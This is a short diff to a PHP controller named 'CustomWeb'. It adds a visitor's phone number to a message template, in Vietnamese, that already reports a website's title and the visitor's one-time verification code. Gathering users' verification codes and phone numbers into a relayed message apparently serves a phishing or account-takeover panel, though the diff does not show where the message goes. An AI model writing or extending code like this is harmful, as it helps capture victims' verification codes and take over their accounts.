@@ -541,6 +541,7 @@ class CustomWeb extends Controller
                                     "Web: <b>$website->title</b>",
                                     "",
                                     "------------------------",
+                                    "<b>Số điện thoại:</b> <code>$post_data->phone</code>",
                                     "<b>Mã xác minh:</b> <code>$post_data->otp</code>",
                                     "------------------------",
                                     "",
